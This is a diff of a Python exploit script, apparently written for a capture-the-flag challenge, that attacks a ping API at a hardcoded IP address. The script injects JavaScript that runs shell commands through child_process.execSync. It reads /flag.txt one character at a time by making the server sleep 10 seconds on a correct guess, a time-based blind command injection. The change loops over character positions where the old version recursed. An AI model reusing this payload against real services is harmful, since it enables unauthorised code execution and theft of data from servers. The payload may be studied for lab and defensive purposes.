@@ -39,52 +39,54 @@ def authenticate():
         print("Authentication failed.")
         return None
 
-# Recursive function to test payloads
-def test_payload(token, tested_characters=""):
+# Function to test payloads with varying head values
+def test_payload(token):
     # Define the character set
     characters = string.ascii_letters + string.digits + string.punctuation
     ping_url = "http://94.237.51.127:35539/api/service/ping"
+    
+    for head_value in range(1, 26):  # Loop through head values from 1 to 25
+        print(f"Testing head -c {head_value}")
 
-    for character in characters:
-        # Escape single quotes and backslashes in the character
-        escaped_character = character.replace("\\", "\\\\").replace("'", "\\'")
+        for character in characters:
+            # Escape single quotes and backslashes in the character
+            escaped_character = character.replace("\\", "\\\\").replace("'", "\\'")
 
-        # Create the payload for the ping endpoint with the current character
-        payload = f'{{"ip":"127.0.0.1"}}\').ip + require(\'child_process\').execSync(\'cat /flag.txt | head -c 1 | tail -c 1 | {{ read c; if [ \"$c\" = \"{tested_characters + escaped_character}\" ]; then sleep 10; fi; }}\')//"}}'
-        print(f"Testing characters: {tested_characters + character}")
+            # Create the payload for the ping endpoint with the current character
+            payload = f'{{"ip":"127.0.0.1"}}\').ip + require(\'child_process\').execSync(\'cat /flag.txt | head -c {head_value} | tail -c 1 | {{ read c; if [ "$c" = "{escaped_character}" ]; then sleep 10; fi; }}\')//"}}'
+            print(f"Testing payload: {payload}")
 
-        # Define the curl command for the ping request
-        ping_command = [
-            "curl", "-X", "POST", ping_url,
-            "-H", "Content-Type: application/json",
-            "-H", f"Authorization: Bearer {token}",
-            "-d", json.dumps({"external": "true", "ip": payload})
-        ]
+            # Define the curl command for the ping request
+            ping_command = [
+                "curl", "-X", "POST", ping_url,
+                "-H", "Content-Type: application/json",
+                "-H", f"Authorization: Bearer {token}",
+                "-d", json.dumps({"external": "true", "ip": payload})
+            ]
 
-        # Measure the response time
-        start_time = time.time()
-        ping_result = subprocess.run(ping_command, capture_output=True, text=True)
-        end_time = time.time()
+            # Measure the response time
+            start_time = time.time()
+            ping_result = subprocess.run(ping_command, capture_output=True, text=True)
+            end_time = time.time()
 
-        response_time = end_time - start_time
-        print(f"Payload Response Status Code: {ping_result.returncode}")
-        print(f"Payload Response Body: {ping_result.stdout}")
-        print(f"Response Time: {response_time:.2f} seconds")
+            response_time = end_time - start_time
+            print(f"Payload Response Status Code: {ping_result.returncode}")
+            print(f"Payload Response Body: {ping_result.stdout}")
+            print(f"Response Time: {response_time:.2f} seconds")
 
-        # Check if the response time indicates a delay
-        if response_time >= 10:  # Adjust the threshold as needed
-            print(f"Character causing delay: {tested_characters + character}")
-            # Save the character to delay.txt
-            with open("delay.txt", "a") as file:
-                file.write(f"{tested_characters + character}\n")
-            # Recursively test the next character
-            test_payload(token, tested_characters + character)
-            return
+            # Check if the response time indicates a delay
+            if response_time >= 10:  # Adjust the threshold as needed
+                print(f"Character causing delay: {character} with head -c {head_value}")
+                # Save the character to delay.txt
+                with open("delay.txt", "a") as file:
+                    file.write(f"{character} with head -c {head_value}\n")
+                # No need to test further characters for this head_value, move to the next head_value
+                break
 
 # Perform authentication
 token = authenticate()
 if token:
-    # Start testing payloads
+    # Start testing payloads with varying head values
     test_payload(token)
 else:
     print("Authentication failed.")
